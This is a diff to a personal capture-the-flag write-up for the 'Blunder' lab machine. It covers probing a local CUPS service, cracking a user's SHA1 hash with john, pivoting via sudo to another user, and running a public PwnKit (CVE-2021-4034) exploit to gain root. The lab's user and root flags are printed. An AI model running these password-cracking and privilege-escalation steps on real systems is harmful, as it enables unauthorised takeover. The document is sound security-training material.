@@ -687,11 +687,11 @@ su: Authentication failure
 www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
 ```
 
-negative. 
+negative.
 
 ```
 www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cat /var/www/bludit-3.9.2/bl-content/databases/site.php
-</var/www/bludit-3.9.2/bl-content/databases/site.php   
+</var/www/bludit-3.9.2/bl-content/databases/site.php
 <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
 {
     "title": "A blunder of interesting facts",
@@ -740,7 +740,7 @@ www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cat /var/www/bludit-3.9.2
 
 that is what is shown (mostly) in the second screenshot - url is different
 
-and the same file in the `bludit-3.10.0a` path has a URL of 
+and the same file in the `bludit-3.10.0a` path has a URL of
 ```
     "url": "http:\/\/10.10.10.201\/",
 ```
@@ -841,8 +841,324 @@ cups.
 
 [pret](https://github.com/RUB-NDS/PRET) seems like an obvious way forward.. but 631 is only exposed locally or on IPv6.
 
+kick it around a bit manually first
+```
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ nc -v localhost 631
+nc -v localhost 631
+Connection to localhost 631 port [tcp/ipp] succeeded!
+HELO
+HELO
+TEST
+TEST
+<disconnect>
+```
+
+```
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ wget http://localhost:631
+wget http://localhost:631
+--2022-07-23 20:37:50--  http://localhost:631/
+Resolving localhost (localhost)... 127.0.0.1
+Connecting to localhost (localhost)|127.0.0.1|:631... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2364 (2.3K) [text/html]
+Saving to: 'index.html'
+
+index.html          100%[===================>]   2.31K  --.-KB/s    in 0s
+
+2022-07-23 20:37:50 (345 MB/s) - 'index.html' saved [2364/2364]
+
+www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cat index.html
+cat index.html
+<!DOCTYPE HTML>
+<html>
+  <head>
+    <link rel="stylesheet" href="/cups.css" type="text/css">
+    <link rel="shortcut icon" href="/apple-touch-icon.png" type="image/png">
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=9">
+    <meta name="viewport" content="width=device-width">
+    <title>Home - CUPS 2.2.12</title>
+  </head>
+  <body>
+    <div class="header">
+      <ul>
+        <li><a href="http://www.cups.org/" target="_blank">CUPS.org</a></li>
+        <li><a class="active" href="/">Home</a></li>
+        <li><a href="/admin">Administration</a></li>
+        <li><a href="/classes/">Classes</a></li>
+        <li><a href="/help/">Help</a></li>
+        <li><a href="/jobs/">Jobs</a></li>
+        <li><a href="/printers/">Printers</a></li>
+      </ul>
+    </div>
+    <div class="body">
+      <div class="row">
+        <h1>CUPS 2.2.12</h1>
+        <p>CUPS is the standards-based, open source printing system developed by <a href="http://www.apple.com/">Apple Inc.</a> for macOS<sup>&reg;</sup> and other UNIX<sup>&reg;</sup>-like
+operating systems.</p>
+      </div>
+      <div class="row">
+        <div class="thirds">
+          <h2>CUPS for Users</h2>
+          <p><a href="help/overview.html">Overview of CUPS</a></p>
+          <p><a href="help/options.html">Command-Line Printing and Options</a></p>
+          <p><a href="http://www.cups.org/lists.php?LIST=cups">User Forum</a></p>
+        </div>
+        <div class="thirds">
+          <h2>CUPS for Administrators</h2>
+          <p><a href="admin">Adding Printers and Classes</a></p>
+          <p><a href="help/policies.html">Managing Operation Policies</a></p>
+          <p><a href="help/network.html">Using Network Printers</a></p>
+          <p><a href="help/man-cupsd.conf.html">cupsd.conf Reference</a></p>
+        </div>
+        <div class="thirds">
+          <h2>CUPS for Developers</h2>
+          <p><a href="help/api-overview.html">Introduction to CUPS Programming</a></p>
+          <p><a href="help/api-cups.html">CUPS API</a></p>
+          <p><a href="help/api-filter.html">Filter and Backend Programming</a></p>
+          <p><a href="help/api-httpipp.html">HTTP and IPP APIs</a></p>
+          <p><a href="http://www.cups.org/lists.php?LIST=cups-devel">Developer Forum</a></p>
+        </div>
+      </div>
+    </div>
+    <div class="footer">CUPS and the CUPS logo are trademarks of <a href="http://www.apple.com">Apple Inc.</a> Copyright &copy; 2007-2019 Apple Inc. All rights reserved.</div>
+  </body>
+</html>
+```
+
+ok, so it is the http interface
+
+and version 2.2.12
+
+searchsploit doesn't show any compbatible versions
+
+```
+www-data@blunder:/var/www/bludit-3.9.2$ ./proxy tcp -p :8080 -T tcp -P 10.10.10.191:631
+<.2$ ./proxy tcp -p :8080 -T tcp -P 10.10.10.191:631
+2022/07/23 20:46:56.833453 INFO use tcp parent [10.10.10.191:631]
+2022/07/23 20:46:56.833665 INFO tcp proxy on [::]:8080
+```
+
+but connections to :8080 from the outside are not being accepted.
+
+going back to john, which using rockyou is failing miserably. tried [cewl-creds.txt](cewl-creds.txt) again, also nothing. but made the connection of using contextual wordlists, and cleaned up `/ftp/config.json` into [config-wordlist.txt](config-wordlist.txt), and was stoked to see:
+```
+$ john --wordlist config-wordlist.txt hugo.hash --rules=All
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
+Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
+Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
+Use the "--format=ripemd-160" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
+Use the "--format=has-160" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "raw-SHA1-opencl"
+Use the "--format=raw-SHA1-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=16
+Proceeding with wordlist:/home/conor/git/JohnTheRipper/run/password.lst, rules:All
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Password120      (hugo)
+1g 0:00:00:01 DONE (2022-07-23 14:14) 0.6944g/s 1132Kp/s 1132Kc/s 1132KC/s Go89..Abc12320
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed.
+
+real    0m1.590s
+user    0m1.462s
+sys     0m0.100s
+```
+
+woo! a password.. wait `Password120` isn't contextual - `Proceeding with wordlist:/home/conor/git/JohnTheRipper/run/password.lst, rules:All`
+
+missing space caused the wordlist to not be used, fell back to default.. and got the answer.
+
+```
+www-data@blunder:/ftp$ su hugo
+su hugo
+Password: Password120
+
+hugo@blunder:/ftp$
+```
+
+### hugo
+
+ok, `hugo` can login, let's grab a real shell
+
+```
+hugo@blunder:~$ cat user.txt
+cat user.txt
+1d8b3c45679e13503602bf0cfa16f4c2
+```
+
+flag, then shell
+
+... no ssh exposed, right.
+
+
+linpeas? quick check by hand..
+
+```
+hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+hugo@blunder:~$ id -a
+id -a
+uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
+hugo@blunder:~$ sudo -u shaun /bin/bash
+sudo -u shaun /bin/bash
+shaun@blunder:/home/hugo$ id -a 
+id -a
+uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
+```
+
+ok, shaun has more power.. and notably `lpadmin`.. oh and `lxd`.
+
+
+```
+shaun@blunder:~$ ls /var/log/cups -l
+ls /var/log/cups -l
+total 44
+-rw-r----- 1 root adm 2274 Jul 23 20:46 access_log
+-rw-r----- 1 root adm 9493 Sep  8  2021 access_log.1
+-rw-r----- 1 root adm  239 Jul  6  2021 access_log.2.gz
+-rw-r----- 1 root adm  406 Jul  5  2021 access_log.3.gz
+-rw-r----- 1 root adm  479 Jul  5  2021 access_log.4.gz
+-rw-r----- 1 root adm  265 May 27  2020 access_log.5.gz
+-rw-r----- 1 root adm  489 May 26  2020 access_log.6.gz
+-rw-r----- 1 root adm  324 May 19  2020 access_log.7.gz
+-rw-r----- 1 root adm    0 May 16  2020 error_log
+-rw-r----- 1 root adm   91 May 14  2020 error_log.1
+shaun@blunder:~$ cat /var/log/cups/error_log.1
+cat /var/log/cups/error_log.1
+W [14/May/2020:09:43:04 +0100] Notifier for subscription 44 (dbus://) went away, retrying!
+shaun@blunder:~$ cat /var/log/cups/access_log
+cat /var/log/cups/access_log
+localhost - - [23/Jul/2022:02:18:03 +0100] "POST / HTTP/1.1" 200 349 Create-Printer-Subscriptions successful-ok
+localhost - - [23/Jul/2022:02:18:03 +0100] "POST / HTTP/1.1" 200 176 Create-Printer-Subscriptions successful-ok
+localhost - - [23/Jul/2022:02:18:16 +0100] "POST / HTTP/1.1" 200 361 Create-Printer-Subscriptions successful-ok
+localhost - - [23/Jul/2022:03:16:36 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:04:14:56 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:05:13:16 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:06:11:36 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:07:09:56 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:08:08:16 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:09:06:36 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:10:04:56 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:11:03:16 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:12:01:36 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:12:59:56 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:13:58:16 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:14:56:36 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:15:54:56 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:16:53:17 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:17:51:37 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:18:49:57 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:19:48:17 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+localhost - - [23/Jul/2022:20:46:37 +0100] "POST / HTTP/1.1" 200 184 Renew-Subscription successful-ok
+shaun@blunder:~$ date
+date
+Sat 23 Jul 21:28:34 BST 2022
+```
+
+```
+-rw-------  1 root              root               4938 Jul 23 02:18 vmware-vmsvc-root.log
+-rw-------  1 root              root               4698 Jul 23 02:17 vmware-vmtoolsd-root.log
+-rw-r-----  1 root              adm                   0 Jul  5  2021 vsftpd.log
+-rw-r-----  1 root              adm                 564 Apr 28  2020 vsftpd.log.2
+-rw-------  1 root              root              23159 Nov 28  2019 vsftpd.log.3
+-rw-rw-r--  1 root              utmp              52992 Jul 23 02:18 wtmp
+shaun@blunder:~$ cat /var/log/vsftpd.log.2
+cat /var/log/vsftpd.log.2
+Mon Apr 27 14:29:59 2020 [pid 30769] CONNECT: Client "::ffff:127.0.0.1"
+Mon Apr 27 14:29:59 2020 [pid 30768] [ftp] OK LOGIN: Client "::ffff:127.0.0.1", anon password "mozilla@example.com"
+Mon Apr 27 14:36:59 2020 [pid 32012] CONNECT: Client "::ffff:127.0.0.1"
+Mon Apr 27 14:36:59 2020 [pid 32011] [ftp] OK LOGIN: Client "::ffff:127.0.0.1", anon password "mozilla@example.com"
+Tue Apr 28 11:18:30 2020 [pid 12321] CONNECT: Client "::ffff:127.0.0.1"
+Tue Apr 28 11:18:30 2020 [pid 12320] [ftp] OK LOGIN: Client "::ffff:127.0.0.1", anon password "mozilla@example.com"
+shaun@blunder:~$ cat /var/log/vsftpd.log.3
+cat /var/log/vsftpd.log.3
+cat: /var/log/vsftpd.log.3: Permission denied
+```
+
+intersting? or red herring?
+
+
+### CVE-2021-4034
+
+```
+shaun@blunder:~/CVE-2021-4034-main$ make all
+make all
+cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+mkdir -p GCONV_PATH=.
+cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
+shaun@blunder:~/CVE-2021-4034-main$ ls -la
+ls -la
+total 80
+drwxr-xr-x  4 shaun shaun  4096 Jul 23 21:41  .
+drwxr-xr-x 17 shaun shaun  4096 Jul 23 21:40  ..
+-rwxr-xr-x  1 shaun shaun 16760 Jul 23 21:41  cve-2021-4034
+-rw-r--r--  1 shaun shaun   292 Jan 30 14:21  cve-2021-4034.c
+drwxr-xr-x  2 shaun shaun  4096 Jan 30 14:21  dry-run
+-rw-r--r--  1 shaun shaun    33 Jul 23 21:41  gconv-modules
+drwxr-xr-x  2 shaun shaun  4096 Jul 23 21:41 'GCONV_PATH=.'
+-rw-r--r--  1 shaun shaun   114 Jan 30 14:21  .gitignore
+-rw-r--r--  1 shaun shaun  1071 Jan 30 14:21  LICENSE
+-rw-r--r--  1 shaun shaun   469 Jan 30 14:21  Makefile
+-rw-r--r--  1 shaun shaun   339 Jan 30 14:21  pwnkit.c
+-rwxr-xr-x  1 shaun shaun 16384 Jul 23 21:41  pwnkit.so
+-rw-r--r--  1 shaun shaun  3419 Jan 30 14:21  README.md
+shaun@blunder:~/CVE-2021-4034-main$ ./cve-2021-4034
+./cve-2021-4034
+# id -a
+id -a
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare),1000(shaun)
+# pwd
+pwd
+/home/shaun/CVE-2021-4034-main
+# cd /root
+cd /root
+# ls -la
+ls -la
+total 64
+drwx------  7 root root  4096 Sep  8  2021 .
+drwxr-xr-x 21 root root  4096 Jul  6  2021 ..
+lrwxrwxrwx  1 root root     9 Apr 28  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  3106 Aug 27  2019 .bashrc
+drwx------  6 root root  4096 Nov 27  2019 .cache
+drwx------  8 root root  4096 Nov 27  2019 .config
+drwx------  3 root root  4096 Nov 27  2019 .dbus
+drwxr-xr-x  3 root root  4096 Nov 27  2019 .local
+-rw-r--r--  1 root root   148 Aug 27  2019 .profile
+-rw-r--r--  1 root root    75 Sep  8  2021 .selected_editor
+-rw-------  1 root root 12308 Sep  8  2021 .viminfo
+-rw-r--r--  1 root root     0 Sep  8  2021 log
+-rwxr-xr-x  1 root root   191 Sep  8  2021 reset.sh
+-r--------  1 root root    33 Jul 23 02:18 root.txt
+drwxr-xr-x  5 root root  4096 Jul  5  2021 snap
+# cat root.txt
+cat root.txt
+5402ad812a6c8b34ad7e89fe7ebbc64c
+```
+
+since this machine was released in 2021/05, it's likely this was not the intended way to root.
+
+
+
+
+
 ## flag
 ```
-user:
+user:1d8b3c45679e13503602bf0cfa16f4c2
 root:
 ```
